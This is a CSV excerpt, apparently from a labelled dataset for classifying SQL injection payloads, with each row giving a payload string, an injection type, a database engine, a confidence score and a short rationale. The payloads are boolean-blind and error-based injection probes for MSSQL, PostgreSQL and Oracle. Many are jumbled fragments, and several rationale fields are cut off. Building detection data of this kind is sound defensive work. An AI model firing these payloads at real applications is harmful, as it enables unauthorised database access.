id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38344,"-1190\' and username = ""-8112\' ) ) ) or username = ""-5667%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38345,"select * from users WHERE username = ""-9644 ) ) or username = ""-9564 or username = ""-7072\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38346,"1\' ) or username = ""1\' ) ) and ( ( \'mmfq\' = \'mmfq",unknown,generic,0.50,Insufficient data to classify payload type,1
38347,"select * from users WHERE username = ""1 ) ) ) and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38348,"select * from users WHERE username = ""1\' ) and ( \'ulkq\' = \'ulkq"" or username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38349,"select * from users WHERE username = ""-2992\' ) ) or ( ( \'tjgt\' = \'tjgt"" or username = ""1\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38350,"select * from users WHERE username = ""-1641\' ) ) or username = ""-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38351,"select * from users WHERE username = ""-2806\' ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""-1854\' ) as fmmq where 7326 = 7326",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38352,"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38353,"1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1%\' ) ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38354,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-2756\' where 6156 = 6156 and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38355,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 or username = ""1%\' or username = ""1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38356,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-1190\' and \'yxry\' like \'yxry"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38357,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and ( 2576 = 2576"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38358,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38359,"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" or username = ""-7720 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38360,"select * from users WHERE username = ""1 and username = ""-5863"" or username = ""-1854\' ) as fmmq where 7326 = 7326",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38361,"SELECT * FROM users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) AND username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38362,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""-3424\' ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38363,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-2374 ) and ( 2576 = 2576"" and username = ""-4248 where 3288 = 3288",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38364,"-1641\' ) ) or username = ""-9553 ) ) or ( ( 5299 = 5299"" and username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38365,"-6353%\' ) ) or username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
38366,"select * from users where username = ""-7874 ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38367,"select * from users WHERE username = ""1"" and username = ""1 ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
